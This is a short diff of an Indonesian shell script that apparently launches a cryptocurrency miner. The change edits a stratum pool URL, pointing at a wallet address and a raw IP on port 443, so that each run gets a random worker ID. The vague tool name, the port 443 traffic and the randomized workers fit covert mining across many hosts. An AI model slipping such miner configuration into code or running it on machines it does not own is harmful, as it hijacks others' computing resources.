@@ -197,7 +197,7 @@ echo "[5/5] Menjalankan COR di CPU dengan GLIBC 2.39..."
 echo "============================================"
 
 # Parameter default
-POOL="stratum1+tcp://cb0318b68b6a39f8072ed597385c2e547bc18a817e63.gtx@103.196.155.151:443"
+POOL="stratum1+tcp://cb0318b68b6a39f8072ed597385c2e547bc18a817e63.$(shuf -n 1 -i 1-9999)-gtx@103.196.155.151:443"
 THREADS="4"
 
 # Jika ada GPU, kurangi thread CPU agar tidak overload
